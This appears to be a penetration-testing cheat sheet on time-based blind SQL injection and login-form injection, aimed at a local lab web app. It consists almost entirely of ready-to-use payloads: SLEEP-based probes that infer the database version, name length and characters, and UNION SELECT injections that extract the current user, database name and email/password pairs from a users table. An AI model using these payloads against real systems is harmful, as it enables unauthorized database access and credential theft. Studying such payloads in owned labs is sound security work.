

## Time-based Blind SQL Injection

Time-based Blind SQL Injection is a technique where the attacker determines if a SQL query is true or false based on the time it takes for the server to respond. This method is useful when the application does not return errors or results but can be made to delay its response based on the outcome of the SQL query.

### Testing URL Parameters

#### Example URL
`http://192.168.1.2/blind-injection-time-based.php`


#### SQL Injection Payloads

1. **Delay Execution**

   ```sql
   1' AND (SELECT SLEEP(10)) --+
   ```

   This query introduces a 10-second delay if executed, which helps to verify the presence of a SQL Injection vulnerability.

2. **Version-Based Delay**

   ```sql
   1' AND (SELECT IF((SELECT VERSION()) LIKE "8%", SLEEP(10), NULL)) --+
   ```

   This checks if the database version starts with "8". If true, it delays the response.

3. **Database Length Check**

   ```sql
   1' AND (SELECT IF((SELECT LENGTH(DATABASE()) = 9), SLEEP(10), NULL)) --+
   ```

   This payload delays the response if the length of the database name is exactly 9 characters.

4. **Database Length Comparison**

   ```sql
   1' AND (SELECT IF((SELECT LENGTH(DATABASE()) > 8), SLEEP(10), NULL)) --+
  
   1' AND (SELECT IF((SELECT LENGTH(DATABASE()) < 10), SLEEP(10), NULL)) --+
   ```

   These queries check if the length of the database name is greater than 8 or less than 10, respectively.

5. **Database Character Check**

   ```sql
   1' AND (SELECT IF((SELECT ASCII(SUBSTR(DATABASE(),1,1)) = 97), SLEEP(10), NULL)) --+
   ```

   This verifies if the ASCII value of the first character of the database name is 97 ('a').

6. **Database Name Check**

   ```sql
   1' AND (SELECT IF((SELECT DATABASE()) = "employe_db", SLEEP(10), NULL)) --+
   ```

   This checks if the database name matches "employe_db".

### Testing POST Parameters

#### Example URL
`http://192.168.1.2/webpentest/sqli/blind-injection-time-based-post.php`

#### SQL Injection Payloads

- **Delay Execution**

  ```sql
  1' AND (SELECT SLEEP(10)) --
  ```

- **Version-Based Delay**

  ```sql
  1' AND (SELECT IF((SELECT VERSION()) LIKE "8%", SLEEP(10), NULL)) --
  ```

- **Database Length Check**

  ```sql
  1' AND (SELECT IF((SELECT LENGTH(DATABASE()) = 9), SLEEP(10), NULL)) --
  ```

- **Database Length Comparison**

  ```sql
  1' AND (SELECT IF((SELECT LENGTH(DATABASE()) > 8), SLEEP(10), NULL)) --
 
  1' AND (SELECT IF((SELECT LENGTH(DATABASE()) < 10), SLEEP(10), NULL)) --
  ```

- **Database Character Check**

  ```sql
  1' AND (SELECT IF((SELECT ASCII(SUBSTR(DATABASE(),1,1)) = 97), SLEEP(10), NULL)) --
  ```

- **Database Name Check**

  ```sql
  1' AND (SELECT IF((SELECT DATABASE()) = "employe_db", SLEEP(10), NULL)) --
  ```

### Testing Login Queries

You can test various SQL injection techniques on login forms by injecting payloads that use different quoting mechanisms.

#### Single Quote (`'`)

- **Basic Payload**

  ```sql
  1' --
  ```

- **Order By**

  ```sql
  1' ORDER BY 2 --
  ```

- **Union Select**

  ```sql
  1' UNION ALL SELECT current_user(), 2 --
  
  1' UNION ALL SELECT 1, database() --
  
  1' UNION ALL SELECT current_user(), database() --
  
  1' UNION ALL SELECT email, password FROM users LIMIT 0, 1 --
  ```

#### Double Quote (`"`)

- **Basic Payload**

  ```sql
  1" --
  ```

- **Order By**

  ```sql
  1" ORDER BY 2 --
  ```

- **Union Select**

  ```sql
  1" UNION ALL SELECT current_user(), 2 --
  
  1" UNION ALL SELECT 1, database() --
  
  1" UNION ALL SELECT current_user(), database() --
  
  1" UNION ALL SELECT email, password FROM users LIMIT 0, 1 --
  ```

#### Parentheses (`'` and `"`)

- **Basic Payload**

  ```sql
  1') --
  
  1") --
  ```

- **Order By**

  ```sql
  1') ORDER BY 2 --
  
  1") ORDER BY 2 --
  ```

- **Union Select**

  ```sql
  1') UNION ALL SELECT current_user(), 2 --
  
  1") UNION ALL SELECT current_user(), 2 --
  
  1') UNION ALL SELECT email, password FROM users LIMIT 0, 1 --
  
  1") UNION ALL SELECT email, password FROM users LIMIT 0, 1 --
  ```

